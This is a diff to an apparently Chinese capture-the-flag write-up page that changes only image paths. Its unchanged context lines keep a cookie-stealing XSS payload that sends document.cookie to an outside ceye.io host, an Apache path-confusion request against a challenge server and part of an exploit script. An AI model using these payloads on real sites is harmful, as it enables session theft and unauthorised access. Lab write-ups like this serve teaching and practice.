@@ -419,7 +419,7 @@ https://tool.yuanrenxue.cn/decode_obfuscator
 <p>payload:</p>
 <pre tabindex="0"><code>&lt;script&gt;document.location=&#39;http://dfny33.ceye.io?&#39;+document.cookie;&lt;/script&gt;
 </code></pre><p>将payload输出在留言板，然后访问/admin</p>
-<p><img alt="f01e1737d9537ace6383c2aa28b8be2" loading="lazy" src="./assets/f01e1737d9537ace6383c2aa28b8be2.jpg"></p>
+<p><img alt="f01e1737d9537ace6383c2aa28b8be2" loading="lazy" src="../assets/f01e1737d9537ace6383c2aa28b8be2.jpg"></p>
 <p>成功拿到admin的cookie</p>
 <p>拿admin的cookie访问/flag即可拿到flag</p>
 <h3 id="level-25-双面人派对">Level 25 双面人派对<a hidden class="anchor" aria-hidden="true" href="#level-25-双面人派对">#</a></h3>
@@ -529,7 +529,7 @@ func program(state overseer.State) {
 <p>网上没找到什么poc</p>
 <p>但是可以找到漏洞发现者的一篇文章</p>
 <p><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/</a></p>
-<p><img alt="2dbfbdadba8694e40ae73db901c8c4e" loading="lazy" src="./assets/2dbfbdadba8694e40ae73db901c8c4e.jpg"></p>
+<p><img alt="2dbfbdadba8694e40ae73db901c8c4e" loading="lazy" src="../assets/2dbfbdadba8694e40ae73db901c8c4e.jpg"></p>
 <p>根据这篇文章我们可以构造出paylaod</p>
 <pre tabindex="0"><code>http://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F
 </code></pre><p>这道题多了一个<strong>RewriteCond &ldquo;%{HTTP_USER_AGENT}&rdquo; &ldquo;^L1nk/&rdquo;</strong>，只需要在user-agent前面加上L1nk/即可</p>
@@ -616,7 +616,7 @@ func program(state overseer.State) {
 </span></span><span class="line"><span class="ln">8</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </span></span><span class="line"><span class="ln">9</span><span class="cl">        <span class="k">break</span>
 </span></span></code></pre></div><p>成功执行，拿到flag</p>
-<p><img alt="ce7c9af5b1c85c5b5c60632c51b313a" loading="lazy" src="./assets/ce7c9af5b1c85c5b5c60632c51b313a.png"></p>
+<p><img alt="ce7c9af5b1c85c5b5c60632c51b313a" loading="lazy" src="../assets/ce7c9af5b1c85c5b5c60632c51b313a.png"></p>
 
 
   </div>
